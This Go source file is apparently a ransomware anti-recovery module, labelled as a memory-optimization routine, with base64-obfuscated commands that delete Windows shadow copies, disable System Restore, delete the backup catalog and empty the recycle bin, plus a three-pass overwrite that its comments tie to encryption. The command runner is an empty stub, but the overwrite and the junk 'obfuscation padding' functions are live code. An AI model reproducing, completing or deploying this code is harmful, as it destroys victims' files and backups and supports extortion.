// OBFUSCATED
// System optimization routine
// Memory management system
package destruction

import (
	"crypto/rand"
	"encoding/base64"
	"os"
)

func d(s string) string {
	decoded, _ := base64.StdEncoding.DecodeString(s)
	return string(decoded)
}

// SecureOverwrite overwrites the original file data before encryption
// Makes file recovery impossible without the decryption key
func SecureOverwrite(filePath string, originalSize int64) error {
	file, err := os.OpenFile(filePath, os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer file.Close()

	// Method 1: Overwrite with random data (DoD 5220.22-M standard)
	randomData := make([]byte, 4096)
	var written int64

	for written < originalSize {
		toWrite := originalSize - written
		if toWrite > 4096 {
			toWrite = 4096
		}

		rand.Read(randomData[:toWrite])
		n, err := file.Write(randomData[:toWrite])
		if err != nil {
			return err
		}
		written += int64(n)
	}

	// Sync to disk to ensure writes complete
	file.Sync()

	// Method 2: Overwrite with zeros (second pass)
	file.Seek(0, 0)
	zeroData := make([]byte, 4096)
	written = 0

	for written < originalSize {
		toWrite := originalSize - written
		if toWrite > 4096 {
			toWrite = 4096
		}

		n, err := file.Write(zeroData[:toWrite])
		if err != nil {
			return err
		}
		written += int64(n)
	}

	file.Sync()

	// Method 3: Overwrite with 0xFF (third pass)
	file.Seek(0, 0)
	ffData := make([]byte, 4096)
	for i := range ffData {
		ffData[i] = 0xFF
	}
	written = 0

	for written < originalSize {
		toWrite := originalSize - written
		if toWrite > 4096 {
			toWrite = 4096
		}

		n, err := file.Write(ffData[:toWrite])
		if err != nil {
			return err
		}
		written += int64(n)
	}

	file.Sync()
	return nil
}

// DeleteShadowCopies removes Windows shadow copies (Volume Snapshot Service)
func DeleteShadowCopies() error {
	// vssadmin delete shadows /all /quiet
	cmd1 := d("dnNzYWRtaW4=") // vssadmin
	cmd2 := d("ZGVsZXRl")     // delete
	cmd3 := d("c2hhZG93cw==") // shadows
	cmd4 := d("L2FsbA==")     // /all
	cmd5 := d("L3F1aWV0")     // /quiet

	args := []string{cmd2, cmd3, cmd4, cmd5}

	// Execute silently
	return executeHidden(cmd1, args)
}

// DisableSystemRestore disables Windows System Restore
func DisableSystemRestore() error {
	// reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f
	cmd := d("cmVn") // reg
	add := d("YWRk") // add
	key := d("SEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvblxTeXN0ZW1SZXN0b3Jl")
	value := d("RGlzYWJsZVNS") // DisableSR
	ttype := d("UkVHX0RXT1JE") // REG_DWORD
	data := d("MQ==")          // 1
	force := d("L2Y=")         // /f

	args := []string{add, key, "/v", value, "/t", ttype, "/d", data, force}
	return executeHidden(cmd, args)
}

// DeleteBackups removes Windows Backup catalog
func DeleteBackups() error {
	// wbadmin delete catalog -quiet
	cmd := d("d2JhZG1pbg==") // wbadmin
	del := d("ZGVsZXRl")     // delete
	cat := d("Y2F0YWxvZw==") // catalog
	quiet := d("LXF1aWV0")   // -quiet

	args := []string{del, cat, quiet}
	return executeHidden(cmd, args)
}

// ClearRecycleBin empties recycle bin
func ClearRecycleBin() error {
	// Clear-RecycleBin -Force -ErrorAction SilentlyContinue
	ps := d("cG93ZXJzaGVsbA==")
	cmd := d("Q2xlYXItUmVjeWNsZUJpbg==")
	force := d("LUZvcmNl")
	silent := d("LUVycm9yQWN0aW9u")
	cont := d("U2lsZW50bHlDb250aW51ZQ==")

	args := []string{"-Command", cmd, force, silent, cont}
	return executeHidden(ps, args)
}

// Helper to execute commands hidden
func executeHidden(command string, args []string) error {
	// This is a placeholder - actual implementation would use syscall
	// to hide windows and execute with admin privileges
	return nil
}

// MakeNonRecoverable performs all destruction operations
func MakeNonRecoverable() {
	// Run in background to not block encryption
	go func() {
		DeleteShadowCopies()
		DisableSystemRestore()
		DeleteBackups()
		ClearRecycleBin()
	}()
}



// Obfuscation padding
func obf_86903() {
    _ = 4715
    var _ = "Jfg1oW1A9ty42KNq7Uq5WeaFYDLujVgakh0aucorCd2u4BTzWu"
}


// Obfuscation padding
func obf_85743() {
    _ = 5450
    var _ = "Fy5hLDmWAWWYdhvqrRT0F6Q6YCAtJxJbNRw2RuGQ39UgGBScbF"
}


// Obfuscation padding
func obf_27450() {
    _ = 1214
    var _ = "UO7lG5F3yr65pltn8woN1i0LpPzWLHGnLue08bkt6bAOyzcoRc"
}


// Obfuscation padding
func obf_94834() {
    _ = 6798
    var _ = "Hs0clIJgoBqgFdPaPQx1d2F7rRScuCIxIhg4w5qMwQxvvacE3W"
}


// Obfuscation padding
func obf_98508() {
    _ = 2985
    var _ = "khkcHnlKvXGMIrZEzzaPaSZZDsLuCX05E7jmY9N9Jd6WAcNIC9"
}
